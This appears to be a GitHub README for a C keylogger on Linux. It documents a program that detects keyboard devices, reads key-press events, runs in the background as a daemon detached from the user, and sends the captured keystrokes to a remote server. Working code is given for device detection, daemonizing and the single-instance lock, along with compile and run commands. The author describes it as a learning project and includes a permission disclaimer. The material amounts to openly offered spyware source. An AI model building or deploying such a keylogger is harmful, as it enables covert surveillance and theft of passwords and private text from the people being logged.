# Keylogger-C-Unix

<H4>A simple Keylogger written in C on Unix platform, implemented as a daemon process, that sends keystrokes to a server.</H5>

<H2> Table of contents </H2>
<ul>
    <li><a href="#Compiling">Compiling</a></li>
    <li><a href="#Running">Running</a></li>
    <li><a href="#Finding">Finding keyboard devices</a></li>
    <li><a href="#Choosing">Choosing the right keyboard device</a></li>
    <li><a href="#Reading">Reading events</a></li>
    <li><a href="#Termination">Termination</a></li>
    <li><a href="#Daemonize">Daemonizing</a></li>
    <li><a href="#Single">Single instance daemon and file locking</a></li>
    <li><a href="#Server">Server</a></li>
      <ul>
         <li><a href="#IO">IO/Multiplexing with poll()</a></li>
         <li><a href="#Logging">Logging events session example</a></li>
      </ul>
  <li><a href="#References">References</a></li>
  <li><a href="#Disclaimer">Disclaimer</a></li>
</ul>

<H3 id="Compiling"> Compiling </H3>

```c
gcc main.c keylogger.c daemon.c -o daemon-keylogger
```

<H3 id="Running"> Running </H3>

Synopsis:
 <code><b>executable_path</b> <b>host</b> <b>port</b> <b>timeout</b></code>
<ul>
  <li><b>executable_path</b>: path of the executable</li>
  <li><b>host</b>: server hostname or ip address</li>
  <li><b>port</b>: server port</li> 
  <li><b>timeout</b>: time [ms] in which keylogger will wait for the first keystroke from the user in order to detect the correct keyboard device</li>
</ul>
Running example: <code>./daemon-keylogger 127.0.0.1 12345 60000</code>

<H3 id="Finding"> Finding keyboard devices </H4>
How do we know if an input device is a keyboard device? We can use the event API (<b>EVIOC* functions</b>), which will allow us to query the capabilities and characteristics of an input device.
The following function uses the linux event API to check whether or not an input device is a keyboard device:

```c
   
int isKeyboardDevice(int fd)
{
    int32_t events_bitmask = 0;
    int32_t keys_bitmask = 0;
    int32_t keys = KEY_Q | KEY_A | KEY_Z | KEY_1 | KEY_9;

    if (ioctl(fd, EVIOCGBIT(0, sizeof(events_bitmask)), &events_bitmask) >= 0) 
        if ((events_bitmask & EV_KEY) == EV_KEY)                               
            if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keys_bitmask)), &keys_bitmask) >= 0)
                    return (keys & keys_bitmask) == keys ? 1 : 0;
    return 0;
}

```

The first ioctl call allows us to get the event bits, that is, a bitmask expressing all of the capabilities or features supported by the device, it can tell us if, for example, the device has keys or buttons or if it is a mouse.
If EV_KEY bit is set then we have found a device that has keys or buttons, but we cannot yet be sure that it is a keyboard! A power button will have this bit set but it is not obviously a keyboard. 
However, EVIOCGBIT permits us to make more precise queries about the specific device features, in our case, the second ioctl call, will allow us to know if the device supports "q", "a", "z", "1" and "9", if so, we found a device that acts as a keyboard

<H3 id="Choosing"> Choosing the right keyboard device </H4>
The function <code>int \*findKeyboards(char \*path, int \*num_keyboards)</code> iterates over all input devices in /dev/input directory, namely /dev/input/eventX, and returns an array containing all descriptors of devices that support different keys, using <code>int isKeyboardDevice(int fd)</code> function. I use a keyboard and a gaming mouse(with some fancy buttons on it) and I realized that both were marked as a keyboard device. My gaming mouse supports keys like A, B, C, Q, W E, 1, 2,.. keys that are generally supported by keyboards! In addition to that, it seemed that, at least for this particular gaming mice, EV_REL bits (used to describe devices whose relative axis value changes, like mices precisely) were not even set. In order to provide a robust way of making sure that keylogging occurs on a legit keyboard and not on a gaming mice or some other device passed of as a keyboard, I first retrieve a list of descriptors of possible keyboard devices, and then function <code> int findRealKeyboard(int *keyboards, int num_keyboards, int timeout, int *keyboard) </code> will listen over every descriptor of that list, using poll() system call, and returns the first descriptor over which a legit keycode has been recorded (for example, user presses on ‘A’ key).
<H3 id="Reading"> Reading events </H4>
Retrieving events from a device requires a standard character device “read" function. Each time you read from an event device you will get a number of events. Every event consists of a struct input_event. If you wish to know more about input_event fields, give a look at https://www.kernel.org/doc/Documentation/input/event-codes.txt.

```c

struct input_event {
      struct timeval time;
      unsigned short type;
      unsigned short code;
      unsigned int value; 
      };

```

When trying to read from the keyboard device you may not get exactly what you would expect, that is, a unique event containing the code of the key you have just pressed. This happens because, generally, a single hardware event is mapped into multiple "software" input events. This is what happens if I try to read from the keyboard device after pressing the letter "a":

![image](https://user-images.githubusercontent.com/75443422/177127789-686ff558-e1cc-4a9d-85b2-ea77ba325387.png)

As you can see, a single key press has generated six input events. Let us take a look at each of those events:
<ol>
<li>Type = 4 indicates an EV_MSC event, which according to the documentation is used to describe miscellaneous input data that do not fit into other types. From what my understanding is, it returns in the "value" field the device specific scan code, so, we are not really interested in it, because we could get wrong key codes if user remaps the keys. It is not completely useless though, it could be used to recognize which specific physical buttons are being pressed.</li>
<li>This is the event we are mostly interested in. It has type = EV_KEY, which tells us that a key has either been pressed, released or repeated,  value = 1 tells us that a key has been pressed and code = "30" represents the KEY_A key, which is in fact the key I pressed.</li>
<li>Type = 0 indicates an EV_SYN event, which is simply used to separate different hardware events.</li><br>
<ol>
The other three events generated are almost the same as the first three, they are associated to the hardware event of "releasing a key". If you take a look at the fifth event, you can see that we have an EV_KEY event with value = 0 that represents a key release, in this case, of the letter "a".<br>
<em>In my program, only key press events will be captured, so, events whose type = EV_KEY and value = 1.</em>

<H3 id="Termination">Termination</H4>
Keylogger process can terminate gracefully by receiving two signals:
1) SIGTERM 
2) SIGPIPE (Closing Server)

<H3 id="Daemonize">Daemonizing</H4>
I thought that it would be nice having the keylogger running in background (under no direct control of the user). For this reason I choose to implement the program as a daemon process. The process is converted to a daemon. I added a few comments that explain all the steps required to daemonize a process, so I'll just leave the daemonize function here:

```c

int daemonize()
{
    pid_t pid;
    struct rlimit limit;

    umask(0); /* Resetting process file mode creation mask */

    if (getrlimit(RLIMIT_NOFILE, &limit) < 0) /* Getting max number of file descriptors that process can open. */
        return 0;

    pid = fork(); /* Parent exits, Child inherits session and process group id of the terminated parent. Child is now orphane and is attached to init process. */
    if (pid < 0)
        return 0;
    if (pid)
        exit(EXIT_SUCCESS);

    setsid(); /* A new session is created. Child becomes leader of the session and of a new process group, it is detached from the parent's controlling terminal */

    pid = fork(); /* After the first fork, the process could still be take control of a TTY because it is the session leader!.
                    This fork will generate a new child which will not be the session leader anymore. We have successfully daemonized our process. */
    if (pid < 0)
        return 0;
    if (pid)
        exit(EXIT_SUCCESS);

    /* chdir("/");  Changes the working directory to a safe one. */

    if (limit.rlim_max == RLIM_INFINITY)
        limit.rlim_max = 1024;

    for (int i = 0; i < limit.rlim_max; i++) /* Closing all file descriptors */
        close(i);

    return 1;
}

```

<H3 id="Single">Single instance daemon and file locking</H4>
Only one instance of the keylogger will run. To ensure that only a copy of the daemon runs at a time, the daemon itself creates a file with a fixed name (in our case, "keylogger-daemon.pid") and places a write lock on the entire file, and also writes its pid in it. If other processes want to acquire a write lock on that particular file, they will fail in the intent because another daemon already owns the lock, that is, another instance of the same daemon is already running. This is the function that checks whether or not another instance is already running, if it is not the case, it returns the locked file:
  
```c
  
int daemonAlreadyRunning(int *lock_file)
{
    char buf[16];
    int fd = open(LOCKFILE, O_RDWR | O_CREAT, LOCKMODE); /* Opening file */
    if (fd < 0)                                          /* If open went wrong */
        return 2;
    if (lockfile(fd) < 0) /* If lockfile went wrong */
    {
        if (errno == EACCES || errno == EAGAIN) /* If lockfile failed with errno set to EACCESS or EAGAIN
                                                   it means that the lock has already been running so another is  daemon is running */
        {
            close(fd);
            return 1;
        }
        close(fd);
        return 2;
    }
    /* If Daemon acquired write lock, writes its pid into the locked file */
    ftruncate(fd, 0);
    sprintf(buf, "%ld", (long)getpid());
    write(fd, buf, strlen(buf) + 1);
    *lock_file = fd;
    return 0;
}

  ```
 
<H3 id="Server"> Server </H3>
It is a simple server which logs keypress events, to its standard output. I choose single threading because this server is not meant to serve a large amount of clients, but just to listen for keyboard events from a few clients.

<H4 id="IO"> IO/Multiplexing with poll() </H4>

Read operations could block indefinitely, for example when the user on the client side is not pressing any keys for a long time. This behaviour would make our main thread block, thus resulting in not being able to accept new clients. For this reason, we mark the sockets to be non-blocking. In addition to that, we use the poll system call that allows the thread to be notified by the kernel whenever particular events occurr(socket readable, in our case). As soon as we read everything, the read will not block but will, instead, fail and errno will be set to EWOULDBLOCK/EAGAIN, allowing the main thread to regain control. 

<H4 id="Logging"> Logging events session example </H4>
Events are printed in this format : <b>"IP: &ltIP&gt - Time: &ltTIME_SEC&gt - Key: &ltKEY&gt"</b>.Let us look at an example of server receiving events from two clients:

![Immagine 2022-07-04 143610](https://user-images.githubusercontent.com/75443422/177177850-e8e5b965-5d3d-4c6c-8947-77abfc1cf9d7.png)



<H2 id="References"> References </H2>
<ul>
<li>About system calls, signals, daemon processes and other C programming stuff: https://www.amazon.com/Advanced-Programming-UNIX-Environment-3rd/dp/0321637739</li>
<li>About Linux input subsystem:
  <ul>
    <li>https://www.linuxjournal.com/article/6429</li>
    <li>https://www.linuxjournal.com/article/1080</li>
    <li>https://www.kernel.org/doc/Documentation/input/event-codes.txt</li>
    <li>https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h</li>
  </ul>
  <li>About poll system call: https://www.ibm.com/docs/en/i/7.2?topic=designs-using-poll-instead-select</li>
</ul>

<H2 id="Disclaimer"> Disclaimer </H2>
I have developed this program just to learn about the linux input subsystem and to put in practice notions I have acquired during the operating systems class. You shall not run this program on machines where you don't have permissions to log key presses!
